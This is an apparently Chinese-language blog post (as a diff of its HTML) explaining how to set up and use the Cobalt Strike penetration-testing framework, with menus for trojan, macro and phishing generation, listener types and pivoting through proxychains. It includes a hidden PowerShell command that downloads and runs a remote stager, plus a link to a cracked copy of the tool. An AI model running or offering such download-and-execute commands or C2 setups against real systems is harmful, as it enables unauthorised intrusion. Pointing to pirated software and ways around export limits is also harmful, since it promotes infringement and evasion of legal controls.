@@ -1,0 +1,693 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,内网渗透," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> Cobalt Strike 服务器搭建、维护与使用 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              Cobalt Strike 服务器搭建、维护与使用
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-12-25
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/12/25/cobalt-strike-server/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/12/25/cobalt-strike-server/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2017-12-25 Hello_C 信安之路 Cobalt Strike 初体验</p>
+<p>Cobalt Strike 一款以 metasploit 为基础的 GUI 的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。</p>
+<p>钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等。</p>
+<p>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和 sessions。</p>
+<p>Cobalt Strike 据说现在最新版为 3.9，主要分为试用版和付费版，试用版为 21 天，付费版 3500 美元，据说网上也有一些破解教程</p>
+<p><a href="http://www.cnblogs.com/haq5201314/p/7040832.html" target="_blank" rel="external">http://www.cnblogs.com/haq5201314/p/7040832.html</a></p>
+<p>cobaltstrik3.6 破解版下载</p>
+<p><a href="https://pan.baidu.com/s/1qYocNbm" target="_blank" rel="external">https://pan.baidu.com/s/1qYocNbm</a> 密码: 51tg。</p>
+<p>因为 Cobalt Strike 是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要 google 搜索下 usa 的个人代理来绕开限制。</p>
+<p><a href="http://blkstone.github.io/2017/05/18/cobalt-strike/">http://blkstone.github.io/2017/05/18/cobalt-strike/</a></p>
+<h1 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h1><p>Cobalt Strike 需要 JAVA 环境，需要注意的是 JAVA 环境不要安装最新版 (建议使用 Oracle JDK 1.8)，否则会出一些问题，Cobalt Strike 分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上，或者自己想要搭建的环境中，服务器端只能运行在 Linux 系统上。其中关键的文件是 teamserver 以及 cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./teamserver <span class="number">192.168</span><span class="meta">.3</span><span class="meta">.32</span> <span class="keyword">test</span>   # 服务器<span class="built_in">IP</span> 和 客户端连接密码</div></pre></td></tr></table></figure>
+<p>说一下我安装运行时遇到的坑：<br>首先：JAVA 版本必须为 1.8，否则就因版本问题无法编译运行；<br>其次：IP 必须为真实 IP，不能使用 0.0.0.0 或者 127.0.0.1，这样也会报错的。<br>服务器端运行之后，我们就可以运行客户端了，客户端可以在 Windows 或者 Linux 下都可以。<br>输入我们刚才 IP 以及端口、密码，用户名可以任意设置。</p>
+<p>当攻击目标在控制台所操作的指令都会被记录到保留在 Cobalt Strike 目录 logs 下，对了，破解版是无法更新的。</p>
+<h1 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h1><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">New<span class="built_in"> Connection </span> #进行另外一个连接，支持连接多个服务器端</div><div class="line">Preferences    #设置 Cobal Strike 界面、控制台、以及输出报告样式、TeamServer 连接记录</div><div class="line">Visualization  #主要展示输出结果的形式</div><div class="line">VPN Interfaces  #设置 VPN 接口</div><div class="line">Listenrs  #创建一个 Listener</div><div class="line">Script Manager  </div><div class="line">Close  #退出连接</div></pre></td></tr></table></figure>
+<h2 id="View"><a href="#View" class="headerlink" title="View"></a>View</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Applications  <span class="meta">#显示受害者机器的应用信息</span></div><div class="line">Credentials  <span class="meta">#凭证当通过 hashdump 或者 Mimikatz 抓取过的密码都会储存在这里</span></div><div class="line">Downloads  <span class="meta">#下载文件</span></div><div class="line">Event <span class="built_in">Log</span>  <span class="meta">#主机上线记录以及团队协作聊天记录</span></div><div class="line">Keystrokes  <span class="meta">#键盘记录</span></div><div class="line">Proxy Pivots  <span class="meta">#代理模块</span></div><div class="line">Screenshots  <span class="meta">#进程截图</span></div><div class="line">Script Console  <span class="meta">#控制台,在这里可以加载各种脚本 https:<span class="comment">//github.com/rsmudge/cortana-scripts 以增强功能</span></span></div><div class="line">Targets  <span class="meta">#显示目标</span></div><div class="line">Web <span class="built_in">Log</span>  <span class="meta">#Web访问记录</span></div></pre></td></tr></table></figure>
+<h2 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Packages  #攻击包</div><div class="line">  HTML Application   生成恶意的 HTA 木马文件</div><div class="line">  MS Office Macro   生成 office 宏病毒文件</div><div class="line">  Payload Generator   生成各种语言版本的 payload</div><div class="line">  USB/CD AutoPlay   生成利用自动播放运行的木马文件</div><div class="line">  Windows Dropper   捆绑器，能够对文档类进行捆绑</div><div class="line">  Windows Executable   生成可执行 exe 木马</div><div class="line">  Windows Executable(S)  生成无状态的可执行 exe 木马</div><div class="line"></div><div class="line">Web Drive-by  #钓鱼攻击</div><div class="line">  Manage  对开启的 web 服务进行管理</div><div class="line">  Clone Site  克隆网站，可以记录受害者提交的数据</div><div class="line">  Host File  提供一个文件下载，可以修改 Mime 信息</div><div class="line">  PowerShell Web Delivery  类似于 msf 的 web_delivery </div><div class="line">  Signed Applet Attack  使用 java 自签名的程序进行钓鱼攻击</div><div class="line">  Smart Applet Attack  自动检测 java 版本并进行攻击，针对 Java 1.6.0_45 以下以及 Java 1.7.0_21 以下版本</div><div class="line"> <span class="built_in"> System </span>Profiler  用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等</div><div class="line"></div><div class="line">Spear Phish  #用来邮件钓鱼的模块</div></pre></td></tr></table></figure>
+<h2 id="Reporting"><a href="#Reporting" class="headerlink" title="Reporting"></a>Reporting</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">activity report  <span class="meta">#活动报告生成</span></div><div class="line">Hosts report  <span class="meta">#主机报告</span></div><div class="line">Indicators opromisef <span class="keyword">com</span>   <span class="meta">#目标报告</span></div><div class="line">Sessions report  <span class="meta">#会话报告</span></div><div class="line">Social engineering report  <span class="meta">#社会工程报告</span></div><div class="line">Export data   <span class="meta">#数据出口</span></div></pre></td></tr></table></figure>
+<h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Homepage  #官方主页</div><div class="line">Support  #技术支持</div><div class="line">Arsenal  #开发者</div><div class="line">System information  #版本信息</div><div class="line">About  #关于</div></pre></td></tr></table></figure>
+<h1 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h1><p>首先使用 Cobalt Strike 需要创建一个 Listener，点击 Cobalt Strike-&gt;Listeners ，然后点击 Add 便可以创建自己想要的 Listeners 了， Cobalt Strike3.6 包括<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">windows<span class="regexp">/beacon_dns/</span>reverse_dns_txt</div><div class="line">windows<span class="regexp">/beacon_dns/</span>reverse_http</div><div class="line">windows<span class="regexp">/beacon_http/</span>reverse_http</div><div class="line">windows<span class="regexp">/beacon_https/</span>reverse_https</div><div class="line">windows<span class="regexp">/beacon_smb/</span>bind_pipe</div><div class="line">windows<span class="regexp">/foreign/</span>reverse_dns_txt</div><div class="line">windows<span class="regexp">/foreign/</span>reverse_http</div><div class="line">windows<span class="regexp">/foreign/</span>reverse_https</div><div class="line">windows<span class="regexp">/foreign/</span>reverse_tcp</div></pre></td></tr></table></figure></p>
+<p>其中 windows/beacon 是 Cobalt Strike 自带的模块，包括 dns、http、https、smb 四种方式的监听器，windows/foreign 为外部监听器，即 msf 或者 Armitage 的监听器。选择监听器以后，host 会自动填写我们开启服务时的 ip，配置监听端口，然后保存，监听器就创建好了。</p>
+<p>在创建好监听器，接下来就需要配置我们的客户端了，Cobalt Strike 提供了多种包括攻击方式，在这里我们使用 Powershell 进行攻击。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w <span class="keyword">hidden</span> -<span class="keyword">c</span> <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.3.83:8888/a'))"</span></div></pre></td></tr></table></figure>
+<p>当我们在目标靶机运行上面这条 Powershell 之后，我们的 Cobalt Strike 客户端就会监听到我们的反弹链接，我们就可以看到已经有目标机上线。</p>
+<h1 id="0x04-与-msf-进行联动"><a href="#0x04-与-msf-进行联动" class="headerlink" title="0x04 与 msf 进行联动"></a>0x04 与 msf 进行联动</h1><p>cs 获得了一个上线机器，想把这个机器丢给 msf 中的 meterpreter 获得一个 session 进行控制，这里我们已经获得了一个上线机器。</p>
+<p>Evernote看图</p>
+<p>配置 proxychains.conf，添加 socks4 127.0.0.1 32557，然后就可以通过 proxychains 使用各种工具做内网渗透了。</p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/内网渗透/"> #内网渗透 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/25/http-fuzzing-list/">HTTP fuzzing List</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/25/bug-hunter-tutorial-zseano/">zseano 漏洞赏金猎人系列教程 开放URL重定向</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/12/25/cobalt-strike-server/"
+               data-title="Cobalt Strike 服务器搭建、维护与使用" data-url="http://blkstone.github.io/2017/12/25/cobalt-strike-server/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">511</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">149</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-安装与运行"><span class="nav-number">2.</span> <span class="nav-text">0x01 安装与运行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-参数详情"><span class="nav-number">3.</span> <span class="nav-text">0x02 参数详情</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">3.1.</span> <span class="nav-text">Cobalt Strike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#View"><span class="nav-number">3.2.</span> <span class="nav-text">View</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attacks"><span class="nav-number">3.3.</span> <span class="nav-text">Attacks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reporting"><span class="nav-number">3.4.</span> <span class="nav-text">Reporting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#help"><span class="nav-number">3.5.</span> <span class="nav-text">help</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-基本运行"><span class="nav-number">4.</span> <span class="nav-text">0x03 基本运行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-与-msf-进行联动"><span class="nav-number">5.</span> <span class="nav-text">0x04 与 msf 进行联动</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
